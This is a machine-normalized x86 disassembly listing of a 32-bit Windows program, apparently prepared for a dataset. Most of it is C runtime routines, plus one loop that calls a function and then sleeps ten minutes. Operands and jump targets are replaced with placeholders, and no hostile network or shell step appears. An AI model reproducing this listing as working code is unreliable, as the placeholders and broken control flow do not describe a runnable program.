xor eax eax
and cl 0x1f
shl edx cl
retn
shld edx eax cl
shl eax cl
retn
sub_431090
push ebp
mov ebp esp
sub esp 0x8
push [ ebp - 0x5 ]
lea ecx [ ebp - 0x1 ]
push [ ebp - 0x5 ]
call sub_40db30
sub esp 0x8
call sub_40cde0
push sub_431230
call sub_4178d3
add esp 0x4
mov esp ebp
pop ebp
retn
sub_431150
push ebp
mov ebp esp
sub esp 0x8
push [ ebp - 0x5 ]
lea ecx [ ebp - 0x1 ]
push [ ebp - 0x5 ]
call sub_40db30
sub esp 0x8
call sub_410100
push j_sub_410080
call sub_4178d3
add esp 0x4
mov esp ebp
pop ebp
retn
sub_431230
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0x0
je r-xdata
push esi
mov ecx rw-data
call sub_40d0f0
mov esi [ rw-data ]
lea ecx [ ebp - 0x1 ]
call sub_4018c0
push ecx
call sub_401a50
lea ecx [ ebp - 0x1 ]
call sub_4018c0
push ecx
call sub_401a50
lea ecx [ ebp - 0x1 ]
call sub_4018c0
push esi
call j_sub_417912#2
add esp 0x4
pop esi
mov esp ebp
pop ebp
retn
sub esp 0x8
call sub_40dde0
lea ecx [ ebp - 0x1 ]
call sub_4018c0
push [ rw-data ]
call j_sub_417912#2
add esp 0x4
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
sub_4312c0
push ebp
mov ebp esp
push ecx
mov ecx rw-data
call sub_40d240
lea ecx [ ebp - 0x1 ]
call sub_4018c0
push ecx
call sub_401a50
push [ rw-data ]
call j_sub_417912#2
add esp 0x4
mov [ rw-data ] 0x0
call sub_401000
mov esp ebp
pop ebp
retn
sub_431330
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0x10
jb r-xdata
mov [ rw-data ] 0xf
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov esp ebp
pop ebp
retn
push esi
mov esi [ rw-data ]
lea ecx [ ebp - 0x1 ]
call sub_4018c0
push rw-data
lea ecx [ ebp - 0x1 ]
call sub_401a50
lea ecx [ ebp - 0x1 ]
call sub_4018c0
push esi
call j_sub_417912#2
add esp 0x4
pop esi
sub_4313a0
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0x8
jb r-xdata
xor eax eax
mov [ rw-data ] 0x7
mov [ rw-data ] 0x0
mov [ rw-data ] ax
mov esp ebp
pop ebp
retn
push esi
mov esi [ rw-data ]
lea ecx [ ebp - 0x1 ]
call sub_4018c0
push rw-data
lea ecx [ ebp - 0x1 ]
call sub_401a50
lea ecx [ ebp - 0x1 ]
call sub_4018c0
push esi
call j_sub_417912#2
add esp 0x4
pop esi
sub_431400
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0x8
jb r-xdata
xor eax eax
mov [ rw-data ] 0x7
mov [ rw-data ] 0x0
mov [ rw-data ] ax
mov esp ebp
pop ebp
retn
push esi
mov esi [ rw-data ]
lea ecx [ ebp - 0x1 ]
call sub_4018c0
push rw-data
lea ecx [ ebp - 0x1 ]
call sub_401a50
lea ecx [ ebp - 0x1 ]
call sub_4018c0
push esi
call j_sub_417912#2
add esp 0x4
pop esi
sub_401000
retn
sub_401040
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x8
sub_4010c0
mov eax r--data
retn
sub_401140
mov eax r--data
retn
sub_4011a0
mov eax r--data
retn
sub_401d20
push ebp
mov ebp esp
pop ebp
jmp sub_401c80
sub_402a70
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
lea ecx [ ecx + 0x8 ]
call sub_4029a0
add esp 0x4
pop ebp
retn
sub_405d30
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
add [ ecx + 0x14 ] eax
xor eax eax
pop ebp
retn
sub_405d90
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ eax + 0x18 ] 0x0
mov [ eax + 0x14 ] 0x0
mov eax [ eax + 0x10 ]
mov [ ebp + 0x8 ] eax
mov eax [ eax + 0x4 ]
pop ebp
jmp eax
sub_4063c0
mov [ ecx + 0x78 ] 0x0
mov [ ecx + 0x80 ] 0x1
mov [ ecx + 0x84 ] 0x1
mov [ ecx + 0x88 ] 0x1
mov [ ecx + 0x24 ] 0x0
mov [ ecx + 0x4c ] 0x1
mov [ ecx + 0x48 ] 0x0
mov [ ecx + 0x58 ] 0x0
mov [ ecx + 0x2c ] 0x0
mov [ ecx + 0x30 ] 0x0
mov [ ecx + 0x50 ] 0x1
retn
j_sub_418b71#2
jmp sub_418b71
sub_408a90
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_418b4e
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_408ae0
add ecx 0x4
mov eax 0x1
[ ecx ] eax
retn
sub_408af0
lea eax [ ecx + 0x4 ]
or edx 0xffffffff
[ eax ] edx
mov eax 0x0
cmove eax ecx
retn
sub_408b10
mov ecx [ ecx ]
test ecx ecx
je r-xdata
retn
mov eax [ ecx ]
call [ eax + 0x8 ]
test eax eax
je r-xdata
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx ]
sub_408b30
mov eax 0x1
retn
sub_408c10
push ebp
mov ebp esp
lea eax [ ecx + 0x8 ]
push eax
movzx eax [ ebp + 0x8 ]
push eax
call sub_416cb9
add esp 0x8
pop ebp
retn 0x4
sub_408c60
push ebp
mov ebp esp
lea eax [ ecx + 0x8 ]
push eax
movzx eax [ ebp + 0x8 ]
push eax
call sub_416db6
add esp 0x8
pop ebp
retn 0x4
sub_408cb0
push ebp
mov ebp esp
mov al [ ebp + 0x8 ]
pop ebp
retn 0x4
sub_408ce0
push ebp
mov ebp esp
mov al [ ebp + 0x8 ]
pop ebp
retn 0x8
sub_409010
mov ecx [ ecx ]
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
mov ecx [ eax + ecx + 0x38 ]
test ecx ecx
je r-xdata
retn
mov eax [ ecx ]
jmp [ eax + 0x8 ]
sub_409030
retn 0x1c
sub_40ac70
push esi
mov esi ecx
cmp [ esi + 0x18 ] 0x10
jb r-xdata
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] 0x0
mov [ esi + 0x4 ] 0x0
pop esi
retn
push [ esi + 0x4 ]
call j_sub_417912#2
add esp 0x4
sub_40b0d0
mov [ ecx + 0x18 ] 0xf
mov [ ecx + 0x14 ] 0x0
mov [ ecx + 0x4 ] 0x0
mov [ ecx + 0x30 ] 0xf
mov [ ecx + 0x2c ] 0x0
mov [ ecx + 0x1c ] 0x0
mov eax ecx
retn
sub_40b100
push ebp
mov ebp esp
and esp 0xfffffff8
push ecx
push esi
mov esi [ Sleep@IAT ]
mov edi edi
call sub_40aca0
push 0x927c0
call esi
jmp r-xdata
sub_40b120
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
mov [ ecx ] 0x0
mov eax ecx
retn
sub_40b230
push esi
mov esi ecx
mov eax [ esi ]
test eax eax
je r-xdata
mov [ esi ] 0x0
pop esi
retn
push eax
call sub_417912
add esp 0x4
sub_40b250
mov eax [ ecx - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0x8 ] r--data
mov eax [ ecx - 0x8 ]
mov edx [ eax + 0x4 ]
lea eax [ edx - 0x8 ]
mov [ edx + ecx - 0xc ] eax
retn
sub_40b4f0
push ecx
mov [ ecx ] r--data
call sub_416ed8
pop ecx
retn
sub_40b500
mov eax [ ecx - 0x18 ]
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0x18 ] r--data
mov eax [ ecx - 0x18 ]
mov edx [ eax + 0x4 ]
lea eax [ edx - 0x18 ]
mov [ edx + ecx - 0x1c ] eax
retn
sub_40b810
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ r--data ]
mov [ eax ] ecx
mov ecx [ r--data ]
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] 0x0
mov [ eax + 0xc ] 0x0
mov [ eax + 0x10 ] 0x0
pop ebp
retn 0x14
sub_40b840
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ r--data ]
mov [ eax ] ecx
mov ecx [ r--data ]
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] 0x0
mov [ eax + 0xc ] 0x0
mov [ eax + 0x10 ] 0x0
pop ebp
retn 0x20
sub_40b870
mov eax ecx
retn 0xc
sub_40b880
xor eax eax
retn
sub_40bc60
mov eax [ ecx + 0x50 ]
test eax eax
je r-xdata
retn
push eax
call sub_419288
pop ecx
sub_40bc70
mov eax [ ecx + 0x50 ]
test eax eax
je r-xdata
retn
push eax
call sub_4192f7
pop ecx
sub_40cd40
mov eax [ ecx + 0x1c ]
cmp [ eax ] 0x0
je r-xdata
xor eax eax
cdq
retn
mov eax [ ecx + 0x2c ]
mov eax [ eax ]
cdq
retn
sub_40cd60
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
xor eax eax
cdq
retn
mov eax [ ecx + 0x30 ]
mov eax [ eax ]
cdq
retn
sub_40d0d0
push esi
mov esi ecx
call sub_40d0f0
push [ esi ]
call j_sub_417912#2
add esp 0x4
pop esi
retn
sub_40d7b0
push ebp
mov ebp esp
mov ecx [ ebp + 0x14 ]
mov eax [ ebp + 0xc ]
mov [ ecx ] eax
mov ecx [ ebp + 0x20 ]
mov eax [ ebp + 0x18 ]
mov [ ecx ] eax
mov eax 0x3
pop ebp
retn 0x1c
sub_40d7d0
push ebp
mov ebp esp
mov ecx [ ebp + 0x14 ]
mov eax [ ebp + 0xc ]
mov [ ecx ] eax
xor eax eax
pop ebp
retn 0x10
sub_40d7f0
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
sub eax [ ebp + 0xc ]
cmp [ ebp + 0x14 ] eax
cmovb eax [ ebp + 0x14 ]
pop ebp
retn 0x10
sub_40da0e
mov eax r-xdata
retn
sub_40db30
mov eax ecx
retn 0x8
sub_40db40
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx [ ecx + 0xc ]
mov [ eax ] 0x0
mov [ eax + 0x4 ] 0x0
mov ecx [ ecx ]
mov [ eax ] ecx
mov [ eax + 0x8 ] edx
pop ebp
retn 0x4
sub_40dde0
retn 0x8
sub_40f429
sub ecx [ ecx - 0x4 ]
sub ecx 0x58
jmp sub_401000
sub_40f434
sub ecx [ ecx - 0x4 ]
jmp sub_401000
sub_40f43c
sub ecx [ ecx - 0x4 ]
jmp sub_40c6d0
sub_40f444
sub ecx [ ecx - 0x4 ]
jmp sub_40c770
sub_40f44c
sub ecx [ ecx - 0x4 ]
jmp sub_40c5e0
sub_40f454
sub ecx [ ecx - 0x4 ]
jmp sub_40c630
sub_40fc0c
lea ecx [ ebp - 0xcce0 ]
mov [ ebp - 0xcd1d ] 0x0
call sub_418b71
mov eax r-xdata
retn
sub_413564
lea ecx [ ebp - 0x7d4ac ]
mov [ ebp - 0x7d4e9 ] 0x0
call sub_418b71
mov eax r-xdata
retn
sub_4166d0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
lea ecx [ ebp + 0x10 ]
push ecx
push [ ebp + 0xc ]
push eax
call sub_419f56
add esp 0xc
pop ebp
retn
sub_41673c
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_418b4e
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_416757
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_418b4e
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_416772
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_418b4e
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_41678d
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_418b4e
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_4167a8
mov [ ecx ] r--data
jmp sub_418b71
j_sub_418b71
jmp sub_418b71
sub_416889
push ebp
mov ebp esp
pop ebp
jmp sub_41775f
sub_41697e
mov ecx [ ecx + 0x4 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
test eax eax
je r-xdata
retn
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx ]
sub_416a7d
mov eax [ rw-data ]
retn
sub_416ba3
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x24 ] 0x0
je r-xdata
pop ebp
retn
push [ eax + 0x24 ]
push 0x0
call sub_41aeaf
pop ecx
pop ecx
sub_416bdc
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
push sub_416c23
mov [ rw-data ] 0x1
call sub_41708e
pop ecx
sub_416ff9
push ebp
mov ebp esp
pop ebp
jmp sub_416f57
sub_417002
push ebp
mov ebp esp
push [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax * 4 + r--data ]
push [ ebp + 0x8 ]
call sub_417aa4
add esp 0xc
pop ebp
retn
j_sub_41c24d
jmp sub_41c24d
sub_417024
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ DeleteCriticalSection@IAT ]
pop ebp
retn
sub_417032
push ebp
mov ebp esp
push 0x0
push 0xfa0
push [ ebp + 0x8 ]
call sub_41c798
add esp 0xc
pop ebp
retn
sub_417049
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ EnterCriticalSection@IAT ]
pop ebp
retn
sub_417057
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_417714
push ecx
mov [ ecx ] r--data
call sub_41ebd3
pop ecx
retn
sub_417817
call sub_418848
retn
sub_4178d3
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_4177dd
neg eax
sbb eax eax
neg eax
pop ecx
dec eax
pop ebp
retn
sub_4178e8
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
push 0x19
call sub_41ef02
push 0x1
push 0x0
call sub_41ca7c
add esp 0xc
jmp sub_41ca9b
call eax
sub_417b66
push esi
call sub_4192f7
pop ecx
retn
sub_417b6e
push ebp
mov ebp esp
lea eax [ ebp + 0x14 ]
push eax
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41fb98
add esp 0x14
pop ebp
retn
j_sub_417912
jmp j_sub_417912#2
sub_417d52
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0xffffffff
push [ ebp + 0x8 ]
call sub_417d6d
add esp 0x14
pop ebp
retn
sub_417df6
push esi
call sub_4192f7
pop ecx
retn
sub_417fcb
push esi
call sub_4192f7
pop ecx
retn
sub_41832c
push ebp
mov ebp esp
push 0xa
push 0x0
push [ ebp + 0x8 ]
call sub_422295
add esp 0xc
pop ebp
retn
sub_418446
push esi
call sub_4192f7
pop ecx
retn
sub_418529
push esi
call sub_4192f7
pop ecx
retn
sub_418531
mov ecx [ rw-data ]
or ecx 0x1
xor eax eax
cmp [ rw-data ] ecx
sete al
retn
sub_4185df
call sub_419282
add eax 0x20
push eax
push 0x1
call sub_419331
pop ecx
pop ecx
retn
sub_4186d4
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_4186a2
pop ecx
push [ ebp + 0x8 ]
call [ ExitProcess@IAT ]
sub_418706
push 0x1
push 0x1
push 0x0
call sub_418851
add esp 0xc
retn
sub_418715
push 0x1
push 0x0
push 0x0
call sub_418851
add esp 0xc
retn
sub_4187b5
push ebp
mov ebp esp
push 0x0
push 0x1
push [ ebp + 0x8 ]
call sub_418851
add esp 0xc
pop ebp
retn
sub_41883f
push 0x8
call sub_41ad36
pop ecx
retn
sub_418848
push 0x8
call sub_41ae9a
pop ecx
retn
sub_41896b
cmp [ ebp + 0x10 ] 0x0
je r-xdata
retn
push 0x8
call sub_41ae9a
pop ecx
sub_418980
push ebp
mov ebp esp
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_418851
add esp 0xc
pop ebp
retn
sub_418ad7
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_418b4e
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_418af2
push ebp
mov ebp esp
push esi
lea eax [ ebp + 0x8 ]
push eax
mov esi ecx
call sub_418b0e
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_418b33
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] r--data
mov eax [ eax ]
mov [ ecx + 0x4 ] eax
mov [ ecx + 0x8 ] 0x0
mov eax ecx
pop ebp
retn 0x8
sub_418b71
mov [ ecx ] r--data
jmp sub_418c12
sub_418c12
push esi
mov esi ecx
cmp [ esi + 0x8 ] 0x0
je r-xdata
and [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
pop esi
retn
push [ esi + 0x4 ]
call sub_417912
pop ecx
sub_418c2e
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
retn
mov eax r--data
sub_418e5e
push esi
call sub_4192f7
pop ecx
retn
sub_418f5f
push esi
call sub_4192f7
pop ecx
retn
sub_4190ab
push esi
call sub_4192f7
pop ecx
retn
sub_41910b
test eax eax
jne r-xdata
retn
push [ ebp + 0x18 ]
push esi
push ebx
push edi
call sub_41918a
sub_41917a
test eax eax
jne r-xdata
retn
push [ ebp + 0x14 ]
push edi
push ebx
push esi
call sub_41918a
sub_4191ad
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x20 ]
cmp [ eax ] 0xe06d7363
je r-xdata
call sub_423368
mov [ ebp - 0x24 ] 0x0
mov eax [ ebp - 0x24 ]
retn
sub_41925b
call sub_4196cf
cmp [ rw-data ] 0x0
je r-xdata
push [ rw-data ]
call sub_417912
and [ rw-data ] 0x0
pop ecx
retn
call sub_423d85
sub_4193d8
push esi
call sub_4192f7
pop ecx
retn
sub_41961d
push esi
call sub_4192f7
pop ecx
retn
sub_4196cf
push 0x1
call sub_41972d
pop ecx
retn
sub_419725
push esi
call sub_4192f7
pop ecx
retn
sub_4197d5
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_419331
pop ecx
pop ecx
retn
sub_419808
push 0x1
call sub_41ae9a
pop ecx
retn
sub_41991c
push esi
call sub_4192f7
pop ecx
retn
sub_419924
push ebp
mov ebp esp
push 0x40
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_419860
add esp 0xc
pop ebp
retn
sub_41995f
call sub_4246d6
mov ecx [ eax + 0x14 ]
imul ecx ecx 0x343fd
add ecx 0x269ec3
mov [ eax + 0x14 ] ecx
shr ecx 0x10
and ecx 0x7fff
mov eax ecx
retn
sub_419982
push ebp
mov ebp esp
call sub_4246d6
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x14 ] ecx
pop ebp
retn
sub_419e7c
push ebp
mov ebp esp
push 0x8
call sub_419e88
pop ebp
retn
sub_419f56
push ebp
mov ebp esp
push [ ebp + 0x10 ]
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_419f6e
add esp 0x10
pop ebp
retn
sub_41a123
mov ecx [ ebp - 0x14 ]
mov eax [ ecx ]
mov eax [ eax ]
mov [ ebp - 0x20 ] eax
push ecx
push eax
call sub_425c33
pop ecx
pop ecx
retn
sub_41a137
mov esp [ ebp - 0x18 ]
mov esi [ ebp - 0x20 ]
mov [ ebp - 0x24 ] esi
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
call sub_418706
mov [ ebp - 0x4 ] 0xfffffffe
mov eax esi
call sub_41ecf5
retn
push esi
call sub_4187b5
sub_41a160
push ebp
mov ebp esp
cmp [ rw-data ] 0x1
jne r-xdata
push [ ebp + 0x8 ]
call sub_41ef02
push 0xff
call sub_4186d4
call sub_41eea5
_start
call sub_4260f6
jmp sub_41a010
sub_41a8d6
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_41ae5c
push 0xa
call sub_41ae9a
pop ecx
retn
sub_41ae9a
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push [ eax * 8 + rw-data ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_41b07e
push 0xc
call sub_41ae9a
pop ecx
retn
sub_41b087
call sub_4246d6
mov edx eax
mov eax [ edx + 0x6c ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ eax + 0x90 ]
retn
mov ecx [ rw-data ]
test [ edx + 0x70 ] ecx
jne r-xdata
call sub_424b75
sub_41b274
call sub_4246d6
mov edx eax
mov eax [ edx + 0x6c ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ eax + 0x4 ]
retn
mov ecx [ rw-data ]
test [ edx + 0x70 ] ecx
jne r-xdata
call sub_424b75
sub_41b29a
call sub_4246d6
mov edx eax
mov eax [ edx + 0x6c ]
cmp eax [ rw-data ]
je r-xdata
add eax 0xa0
retn
mov ecx [ rw-data ]
test [ edx + 0x70 ] ecx
jne r-xdata
call sub_424b75
sub_41b9c6
xor eax eax
cmp [ ebp + 0xc ] al
setne al
retn
sub_41b9cf
mov esp [ ebp - 0x18 ]
call sub_423368
sub_41b9f1
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_418b4e
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_41ba0c
mov [ ecx ] r--data
jmp sub_418b71
sub_41bad1
push [ ebp - 0x14 ]
call sub_41bcc5
pop ecx
retn
sub_41bc0a
push 0x4
mov eax sub_4301a3
call sub_41a91d
call sub_4246d6
cmp [ eax + 0x94 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_42339c
call sub_423330
sub_41c24d
call sub_4246d6
xor ecx ecx
cmp [ eax + 0x90 ] ecx
setne al
retn
sub_41c304
xor eax eax
inc eax
retn
sub_41c308
mov esp [ ebp - 0x18 ]
call sub_423368
sub_41c482
xor eax eax
inc eax
retn
sub_41c486
mov esp [ ebp - 0x18 ]
call sub_423368
sub_41c565
push [ ebp - 0x14 ]
call sub_41c496
pop ecx
retn
sub_41c5a3
call sub_4246d6
cmp [ eax + 0x90 ] 0x0
jle r-xdata
retn
call sub_4246d6
dec [ eax + 0x90 ]
sub_41c6f9
push ebp
mov ebp esp
mov eax [ rw-data ]
xor eax [ rw-data ]
je r-xdata
pop ebp
jmp [ TlsAlloc@IAT ]
push [ ebp + 0x8 ]
call eax
pop ebp
retn
sub_41c717
push ebp
mov ebp esp
mov eax [ rw-data ]
xor eax [ rw-data ]
push [ ebp + 0x8 ]
je r-xdata
call [ TlsFree@IAT ]
pop ebp
retn
call eax
pop ebp
retn
sub_41c736
push ebp
mov ebp esp
mov eax [ rw-data ]
xor eax [ rw-data ]
push [ ebp + 0x8 ]
je r-xdata
call [ TlsGetValue@IAT ]
pop ebp
retn
call eax
pop ebp
retn
sub_41ca43
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ SetUnhandledExceptionFilter@IAT ]
pop ebp
retn
sub_41ca51
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
pop ebp
retn
sub_41ca66
push ebp
mov ebp esp
push 0x0
call [ SetUnhandledExceptionFilter@IAT ]
push [ ebp + 0x8 ]
call [ UnhandledExceptionFilter@IAT ]
pop ebp
retn
sub_41ca7c
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
mov eax [ rw-data ]
mov ecx [ ebp + 0x8 ]
and ecx [ ebp + 0xc ]
not edx
and edx eax
or edx ecx
mov [ rw-data ] edx
pop ebp
retn
sub_41cc46
push ebp
mov ebp esp
call sub_41cc5d
cmp [ ebp + 0x8 ] 0x0
je r-xdata
fnclex
pop ebp
retn
call sub_427dd0
sub_41cc5d
mov eax sub_427344
mov [ rw-data ] eax
mov [ rw-data ] sub_427c24
mov [ rw-data ] sub_427cb3
mov [ rw-data ] sub_427d0b
mov [ rw-data ] sub_427d8e
mov [ rw-data ] eax
mov [ rw-data ] sub_427365
mov [ rw-data ] sub_427ccb
mov [ rw-data ] sub_427c35
mov [ rw-data ] sub_427d1c
retn
sub_41e819
push ebp
mov ebp esp
push 0x0
push 0x0
push [ ebp + 0x8 ]
call [ rw-data ]
pop ebp
retn 0x4
sub_41e9e0
sub esp 0xc
fst [ esp ]
call sub_4280f8
call sub_41e9fd
add esp 0xc
retn
sub_41ec3b
push 0xe
call sub_41ae9a
pop ecx
retn
sub_41ec6a
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_41ecf5
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_41f294
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_41f2a1
call [ GetProcessHeap@IAT ]
xor ecx ecx
test eax eax
setne cl
mov [ rw-data ] eax
mov eax ecx
retn
sub_41f3d9
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_41f55b
push 0x1
call sub_41ae9a
pop ecx
retn
sub_41f8d6
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
push [ ecx + 0x1c ]
push [ ecx + 0x18 ]
push [ ecx + 0x28 ]
call sub_41f800
add esp 0xc
pop ebp
retn 0x4
sub_41f909
mov ebp edx
mov esi ecx
mov eax ecx
push 0x1
call sub_4290b5
xor eax eax
xor ebx ebx
xor ecx ecx
xor edx edx
xor edi edi
jmp esi
sub_41f93b
push ebp
mov ebp [ esp + 0x8 ]
push edx
push ecx
push [ esp + 0x14 ]
call sub_41f800
add esp 0xc
pop ebp
retn 0x8
sub_420a4f
push esi
call sub_42a525
pop ecx
retn
sub_4212c0
push esi
call sub_42a525
pop ecx
retn
sub_421bcc
push esi
call sub_42a525
pop ecx
retn
sub_421d39
push edi
call sub_42a525
pop ecx
retn
sub_4220b0
push 0xb
call sub_41ae9a
pop ecx
retn
sub_422295
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4220b9
add esp 0x10
pop ebp
retn
sub_42234e
push esi
call sub_42a525
pop ecx
retn
sub_4232a9
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
xor ecx ecx
cmp [ eax ] 0xc0000005
sete cl
mov eax ecx
retn
sub_423311
push esi
xor esi esi
push [ esi + rw-data ]
call [ EncodePointer@IAT ]
mov [ esi + rw-data ] eax
add esi 0x4
cmp esi 0x28
jb r-xdata
pop esi
retn
sub_423330
push 0x8
push r--data
call sub_41ecb0
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
call sub_423368
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_423354
xor eax eax
inc eax
retn
sub_423368
push 0x8
push r--data
call sub_41ecb0
call sub_4246d6
mov eax [ eax + 0x78 ]
test eax eax
je r-xdata
call sub_41ca9b
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_423388
xor eax eax
inc eax
retn
sub_42339c
call sub_4246d6
mov eax [ eax + 0x7c ]
test eax eax
je r-xdata
jmp sub_423368
call eax
sub_4233af
push sub_423368
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
retn
sub_4233c0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_4233cd
push [ rw-data ]
call [ DecodePointer@IAT ]
retn
sub_4233da
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
pop ebp
retn
sub_423571
test ebx ebx
je r-xdata
retn
push 0x0
call sub_41ae9a
pop ecx
sub_4235e7
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
retn
push 0xfffffffd
call sub_423947
pop ecx
mov [ rw-data ] 0x1
sub_42393e
push 0xd
call sub_41ae9a
pop ecx
retn
sub_423abf
push 0xd
call sub_41ae9a
pop ecx
retn
sub_423e19
push 0x1
call sub_41ae9a
pop ecx
retn
sub_423e8e
push esi
call sub_4192f7
pop ecx
retn
sub_424306
push edi
call sub_42a525
pop ecx
retn
sub_4246c1
push 0xd
call sub_41ae9a
pop ecx
retn
sub_4246cd
push 0xc
call sub_41ae9a
pop ecx
retn
sub_4247fe
push 0xd
call sub_41ae9a
pop ecx
retn
sub_424807
push 0xc
call sub_41ae9a
pop ecx
retn
sub_424886
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
jmp sub_41ad6a
push eax
call sub_41c717
or [ rw-data ] 0xffffffff
pop ecx
sub_424be8
push 0xc
call sub_41ae9a
pop ecx
retn
sub_424c40
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0xf
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_421de0
sub_424c56
push ecx
